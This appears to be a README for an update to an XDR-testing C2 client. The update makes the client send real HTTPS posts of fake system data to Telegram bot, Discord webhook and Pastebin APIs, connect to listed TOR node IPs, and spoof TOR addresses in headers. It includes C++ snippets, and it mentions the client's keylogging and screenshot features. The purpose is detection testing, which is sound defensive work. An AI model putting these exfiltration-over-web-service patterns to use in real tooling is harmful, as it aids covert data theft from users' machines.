# Real Network Traffic Update for TOR/API Detection

## Overview
Updated the C2 client to send **actual network traffic** to suspicious APIs and TOR nodes, rather than just simulating the connections. This generates real network activity that XDR solutions can detect.

## What Changed

### 1. **Real API Calls to Suspicious Services**
The client now makes actual HTTPS requests to:

- **Telegram Bot API**: `https://api.telegram.org/bot123456789:FAKE_BOT_TOKEN/sendMessage`
  - Sends fake message with system info
  - Uses fake bot token (will get 401 Unauthorized)
  - Headers include TOR exit node IPs

- **Discord Webhooks**: `https://discord.com/api/webhooks/123456789123456789/FAKE_WEBHOOK_TOKEN`
  - Sends fake webhook data
  - Simulates C2 communication pattern
  - Will get 404 Not Found due to fake webhook

- **Pastebin API**: `https://pastebin.com/api/api_post.php`
  - Attempts to create private paste with fake data
  - Uses fake API key
  - Simulates data exfiltration pattern

### 2. **Real TOR Node Connection Attempts**
The client attempts actual TCP connections to:
- 62.210.105.116:9001 (France)
- 199.87.154.255:443 (Canada)
- 193.11.114.43:9001 (Sweden)
- 192.42.116.16:9001 (Netherlands)

### 3. **Fake Data Only**
All data sent is clearly marked as security testing:
- Contains phrases like "XDR Test", "This is a security test"
- Uses fake tokens/API keys
- No real credentials or sensitive data

## Technical Implementation

### API Calls
```cpp
// Example: Telegram API call with TOR exit node headers
HINTERNET hRequest = WinHttpOpenRequest(...);
headers = L"X-Forwarded-For: 185.220.101.34\r\n";  // TOR exit node
fakeData = "{\"chat_id\":\"@fake_channel\",\"text\":\"XDR Test: Fake data...\"}";
WinHttpSendRequest(hRequest, headers, -1, fakeData, ...);
```

### TOR Connections
```cpp
// Real socket connection attempts to TOR nodes
SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
connect(sock, (sockaddr*)&torNodeAddr, sizeof(torNodeAddr));
```

## Network Traffic Generated

### HTTP/HTTPS Traffic
- **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
- **Headers**: Include TOR exit node IPs in X-Forwarded-For, X-Originating-IP, X-Real-IP
- **Methods**: POST requests to API endpoints
- **Responses**: Mostly 4xx errors due to fake credentials

### TCP Connections
- Direct TCP connections to TOR node IPs on ports 9001, 443
- Connection attempts (may fail/timeout)
- Non-blocking sockets with 1-second timeout

## XDR Detection Points

1. **Suspicious API Access**
   - Known malicious API endpoints (Telegram bots, Discord webhooks, Pastebin)
   - API calls with TOR exit node IPs in headers
   - Failed authentication attempts

2. **TOR Network Activity**
   - Direct connections to known TOR entry nodes
   - Multiple connection attempts to TOR infrastructure
   - TOR configuration file creation

3. **Data Exfiltration Patterns**
   - POST requests with system information
   - Attempts to create pastes on Pastebin
   - Webhook posts to Discord

## Testing

### Quick Test
```batch
# Start server and client
escapebox.exe server
escapebox.exe client 127.0.0.1 443

# Press 'T' to trigger TOR/API calls
# Watch network traffic in Wireshark or similar
```

### Monitor Network Activity
```powershell
# Check Windows Firewall logs
Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall" | 
    Where-Object {$_.Message -like "*api.telegram.org*" -or $_.Message -like "*discord.com*"}

# Monitor with netstat
netstat -an | findstr "185.220.101.34 62.210.105.116"
```

## Safety Notes

- All API tokens/keys are fake and non-functional
- Data sent is clearly labeled as testing
- No actual data exfiltration occurs
- Connections to TOR nodes may fail (expected)
- All activity is logged locally

## Integration

This update maintains compatibility with existing features:
- Screenshots and keylogging still work as before
- All other commands remain unchanged
- Only TOR/API functionality now generates real traffic
- Can be disabled by not pressing 'T' key

## Expected Behavior

When triggered, you should see:
1. HTTP 401/404 responses from APIs (due to fake credentials)
2. TCP SYN packets to TOR nodes
3. Network connections in netstat/TCPView
4. XDR alerts for suspicious API access from TOR IPs
5. Firewall logs showing outbound connections

The fake credentials ensure the APIs reject the requests while still generating detectable network traffic patterns.
